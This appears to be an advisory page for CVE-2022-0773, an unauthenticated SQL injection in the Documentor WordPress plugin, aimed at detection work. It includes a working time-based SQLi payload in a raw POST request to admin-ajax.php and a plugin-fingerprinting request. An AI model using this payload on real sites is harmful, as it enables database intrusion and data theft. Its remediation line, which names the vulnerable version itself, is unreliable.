---
layout: post
cve_id: CVE-2022-0773
title: Documentor <= 1.5.3 - Unauthenticated SQL Injection
pcap: true
pcap_path: /pcaps/2022/CVE-2022-0773.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-0773.yaml
snort2_rule: N/A
snort3_rule: N/A
author: theamanrawat
severity: critical
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary SQL queries, potentially leading to unauthorized access, data
  leakage, or data manipulation.

  '
remediation: 'Update to Documentor version 1.5.3 or later to mitigate this vulnerability.

  '
reference:
- https://wpscan.com/vulnerability/55b89de0-30ed-4f98-935e-51f069faf6fc
- https://wordpress.org/plugins/documentor-lite/
- https://nvd.nist.gov/vuln/detail/CVE-2022-0773
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2022-0773
  cwe-id: CWE-89
  epss-score: 0.75514
  epss-percentile: 0.9885
  cpe: cpe:2.3:a:documentor_project:documentor:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 2
  vendor: documentor_project
  product: documentor
  framework: wordpress
tags:
- time-based-sqli
- cve2022
- cve
- unauth
- sqli
- wp-plugin
- wp
- documentor-lite
- wpscan
- wordpress
- documentor_project
- vuln
---

## ðŸ” Vulnerability Description
The Documentor WordPress plugin through 1.5.3 fails to sanitize and escape user input before it is being interpolated in an SQL statement and then executed, leading to an SQL Injection exploitable by unauthenticated users.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Connection: close
Content-Length: 85
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

action=doc_search_results&term=&docid=1+AND+(SELECT+6288+FROM+(SELECT(SLEEP(6)))HRaz)
```

```nohighlight
GET /wp-content/plugins/documentor-lite/core/js/documentor.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.27 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/601.1.27
Connection: close
Accept-Encoding: gzip
```

